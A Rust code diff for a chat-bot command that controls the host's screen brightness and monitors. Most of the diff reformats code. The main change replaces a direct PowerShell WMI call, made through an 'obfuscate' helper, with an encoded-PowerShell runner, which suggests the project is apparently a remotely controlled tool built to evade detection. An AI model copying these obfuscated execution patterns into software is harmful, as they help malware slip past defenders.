@@ -14,10 +14,18 @@ pub struct ScreenCommand;
 
 #[async_trait]
 impl BotCommand for ScreenCommand {
-    fn name(&self) -> &str { "screen" }
-    fn description(&self) -> &str { "Control screen brightness and monitors" }
-    fn category(&self) -> &str { "system" }
-    fn usage(&self) -> &str { ".screen <brightness|monitors> <value|on|off>" }
+    fn name(&self) -> &str {
+        "screen"
+    }
+    fn description(&self) -> &str {
+        "Control screen brightness and monitors"
+    }
+    fn category(&self) -> &str {
+        "system"
+    }
+    fn usage(&self) -> &str {
+        ".screen <brightness|monitors> <value|on|off>"
+    }
     fn examples(&self) -> &'static [&'static str] {
         &[
             ".screen brightness 50",
@@ -26,7 +34,9 @@ impl BotCommand for ScreenCommand {
             ".screen monitors off",
         ]
     }
-    fn aliases(&self) -> &'static [&'static str] { &["scr"] }
+    fn aliases(&self) -> &'static [&'static str] {
+        &["scr"]
+    }
 
     async fn execute(
         &self,
@@ -71,7 +81,10 @@ impl BotCommand for ScreenCommand {
                 match result {
                     Ok(_) => {
                         http.create_message(msg.channel_id)
-                            .content(&format!("Successfully set brightness to {}%", brightness_value))
+                            .content(&format!(
+                                "Successfully set brightness to {}%",
+                                brightness_value
+                            ))
                             .await?;
                     }
                     Err(e) => {
@@ -104,13 +117,11 @@ impl BotCommand for ScreenCommand {
                 }
                 let status = if enable { "on" } else { "off" };
                 http.create_message(msg.channel_id)
-                    .content(&format!("Successfully sent command to turn monitors {}", status))
+                    .content(&format!(
+                        "Successfully sent command to turn monitors {}",
+                        status
+                    ))
                     .await?;
-
-                http.create_message(msg.channel_id)
-                    .content("**Error**: This command is only available on Windows")
-                    .await?;
-                
             }
             _ => {
                 http.create_message(msg.channel_id)
@@ -123,25 +134,38 @@ impl BotCommand for ScreenCommand {
     }
 }
 
+// fn set_brightness(brightness: u32) -> Result<()> {
+//     use crate::utils::obfuscate::{exe, powershell as ps};
+//     use std::process::Command;
+// 
+//     // set brightness via WMI
+//     let script = format!(
+//         r#"(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,{})"#,
+//         brightness
+//     );
+// 
+//     let output = Command::new(exe::powershell())
+//         .args(&[&ps::no_profile(), &ps::command(), &script])
+//         .output()?;
+// 
+//     if output.status.success() {
+//         Ok(())
+//     } else {
+//         let error = String::from_utf8_lossy(&output.stderr);
+//         Err(anyhow::anyhow!("Failed to set brightness: {}", error))
+//     }
+// }
 fn set_brightness(brightness: u32) -> Result<()> {
-    use std::process::Command;
-    use crate::utils::obfuscate::{exe, powershell as ps};
-
-    // set brightness via WMI
-    let script = format!(
-        r#"(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,{})"#,
-        brightness
-    );
-
-    let output = Command::new(exe::powershell())
-        .args(&[&ps::no_profile(), &ps::command(), &script])
-        .output()?;
-
+    use crate::utils::ps_encoder::{run_encoded, scripts};
+    
+    let script = scripts::set_brightness_template()
+        .replace("{}", &brightness.to_string());
+    
+    let output = run_encoded(&script)?;
+    
     if output.status.success() {
         Ok(())
     } else {
-        let error = String::from_utf8_lossy(&output.stderr);
-        Err(anyhow::anyhow!("Failed to set brightness: {}", error))
+        Err(anyhow::anyhow!("Failed to set brightness"))
     }
 }
-
